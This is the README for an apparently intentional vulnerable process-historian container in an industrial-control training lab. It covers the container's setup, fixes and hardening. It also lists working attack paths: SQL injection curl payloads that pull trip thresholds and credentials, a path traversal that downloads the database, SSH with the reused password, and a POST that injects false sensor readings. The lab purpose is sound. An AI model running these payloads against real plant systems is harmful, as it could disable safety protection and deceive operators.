# Process historian

`uupl-historian` has been running since 1997. The original contractor completed
the installation, set the credentials, and left. Nobody has touched the schema
since. Nobody has changed the password since. The web interface was added later
by someone who needed remote access to reports and was in a hurry; the query
parameter goes straight into the SQL string because the network was internal and
it was quicker. Ticket HEX-1847 (SQL injection in /report) was filed in 2019 and
closed won't-fix. Ticket HEX-2291 (path traversal in /export) was never filed.
The bug is documented in the on-disk notes as known behaviour.

## In real deployments

Process historians are the time-series backbone of any serious OT site. They
store every sensor reading, alarm event, and operational metric, and every other
system in the plant eventually queries them. In real environments, historians are
frequently legacy systems installed before OT security was considered a discipline:
the authentication model is "if you are on the network, you are authorised." The
SQL injection and path traversal here reflect a documented pattern in industrial
web interfaces from the late 1990s and early 2000s, when these applications were
written by engineers for engineers and security review was not part of the process.

## Container details

Base image: `debian:bookworm-slim`. Login shell for `hist_admin` is
`winserver2019_shell.sh`, a PowerShell facade over Bash.

SSH on port 22: password authentication, Windows Server 2019 banner.
Flask web service on port 8080, no authentication on read endpoints.

User: `hist_admin`, password `Historian2015`. Root login disabled.

Database: SQLite at `/opt/historian/data/historian.db`. Three tables: `readings`
(time-series data), `alarm_config` (trip thresholds), `config` (credentials).

Virtual Windows filesystem at `/opt/winsvr/C/`. The profile root is
`/opt/winsvr/C/Users/hist_admin/`.

Key files in the virtual profile:
- `C:\Historian\Config\historian.ini`: database and ingest credentials in plaintext
- `C:\Historian\Config\data_sources.xml`: Modbus polling targets (PLC and meter IPs)
- `C:\Historian\Data\README.txt`: schema notes and a hint about the path traversal
- `C:\Historian\Archive\export_schedule.txt`: export filenames and traversal note
- `Desktop\README.txt`: quick reference for web endpoints

PSReadLine history includes direct `sqlite3` access to the database.

## Connections

- `ics_operational`: 10.10.2.10
- Queried by `distribution-scada` (10.10.2.20) via web API
- Queried by `uupl-eng-ws` (10.10.2.30) via web API and SSH
- Reachable from `bursar-desk` (10.10.2.100) on the operational NIC

## Protocols

SSH: port 22.
HTTP: port 8080.

Web endpoints:

| Endpoint  | Method | Auth         | Description                                   |
|-----------|--------|--------------|-----------------------------------------------|
| /         | GET    | none         | Version banner                                |
| /report   | GET    | none         | CSV time-series, asset + date range params    |
| /assets   | GET    | none         | Lists all known asset names                   |
| /export   | GET    | none         | Serves files from exports directory           |
| /status   | GET    | none         | JSON health check                             |
| /ingest   | POST   | Basic (weak) | Writes records directly to the readings table |

## Built-in vulnerabilities

SQL injection in `/report`: the `asset` parameter is interpolated directly into
the query string with no sanitisation. The error message is returned verbatim on
failure, which confirms injection and discloses table names. The `alarm_config`
table contains exact trip thresholds for every monitored asset; reading it reveals
the precise register values needed to disable protection. The `config` table
contains the database password. Bug filed HEX-1847, closed won't-fix 2019.

Path traversal in `/export`: the `tag` parameter is joined to the exports
directory with `os.path.join` and no sanitisation. `tag=../historian.db` returns
the entire SQLite database as a download. Bug never formally filed; noted in
on-disk documentation as known behaviour.

Credential reuse: the database password `Historian2015` is also the SSH password
for `hist_admin`. The `historian.ini` config file notes this explicitly with the
comment "easier to remember."

Weak ingest authentication: `/ingest` accepts arbitrary time-series records
authenticated only by `hist_read:history2017`. These credentials are documented
in the SCADA server config. Once authenticated, the endpoint writes directly to
the readings table with no validation of asset names or values. An attacker can
inject false readings that appear on the SCADA dashboard as real plant data.

## Modifying vulnerabilities

To fix the SQL injection: replace string formatting in `app/server.py` with
parameterised queries (`db.execute("... WHERE asset = ?", (asset,))`).

To fix the path traversal: resolve the path and confirm it falls inside
`EXPORT_DIR` before opening.

To change the password: edit the `chpasswd` line in the Dockerfile and update
the credentials in the `historian.ini` heredoc in `entrypoint.sh`.

To remove the ingest endpoint entirely: delete the `/ingest` route from
`app/server.py` and remove the `hist_read` / `history2017` entries from the
`historian.ini` heredoc.

To add authentication to read endpoints: wrap `/report`, `/export`, and `/assets`
with the same `_require_ingest_auth` decorator, using different credentials.

## Hardening suggestions

Parameterise every SQL query. Sanitise file paths on the export endpoint.
Separate the SSH account from the database credential; rotate both. Add
authentication to read-only endpoints. Consider whether `/ingest` needs a network
route from the internet-facing DMZ at all.

## Observability and debugging

```bash
docker logs historian
docker exec -it historian bash
ssh hist_admin@10.10.2.10      # password: Historian2015
curl http://10.10.2.10:8080/status
curl http://10.10.2.10:8080/assets
```

Inside, the virtual C: drive is at `/opt/winsvr/C/`. The SQLite database is at
`/opt/historian/data/historian.db` and can be queried with `sqlite3` directly.

## Concrete attack paths

From the enterprise zone (e.g. `bursar-desk` via its operational NIC 10.10.2.100):

1. `curl http://10.10.2.10:8080/assets` confirms the historian is alive and lists
   all asset names.
2. SQL injection to enumerate tables:
   `curl "http://10.10.2.10:8080/report?asset=x' UNION SELECT name,sql,'x' FROM sqlite_master--&from=0&to=9"`
3. Inject against `alarm_config` to read trip thresholds:
   `curl "http://10.10.2.10:8080/report?asset=x' UNION SELECT asset,hi_hi,unit FROM alarm_config--&from=0&to=9"`
4. Inject against `config` to recover `Historian2015`.
5. `ssh hist_admin@10.10.2.10` with the same password for an interactive shell.
6. Path traversal to download the raw database:
   `curl "http://10.10.2.10:8080/export?tag=../historian.db" -o historian.db`
7. Inject false readings: `curl -u hist_read:history2017 -X POST -H "Content-Type: application/json" -d '{"timestamp":"2026-04-12T09:00:00","asset":"turbine_rpm","value":3500,"unit":"RPM"}' http://10.10.2.10:8080/ingest`

## Heads up

The Windows Server 2019 facade is cosmetic. Real Linux commands work if typed
directly. The `win10shell` approximates `dir`, `type`, `cd`, and `cls`.

The `/export` path traversal is on the Linux filesystem, not the virtual Windows
profile. `../historian.db` works because `EXPORT_DIR` is
`/opt/historian/data/exports/` and the database is one directory up.

The `alarm_config` table is the most operationally significant loot: it gives an
attacker the exact RPM, voltage, and current values at which protection trips,
which is the information needed to write relay threshold registers that disable
protection silently.

## Bottom line

Process historian, 1997 vintage. SQLite database behind a Flask web interface
with SQL injection in the query endpoint and path traversal in the export
endpoint, both unauthenticated. Database password equals SSH password: recover
one, get both. Contains exact trip thresholds for every relay and interlock in
the plant. Injecting false readings via `/ingest` makes the SCADA dashboard
display whatever values an attacker chooses.
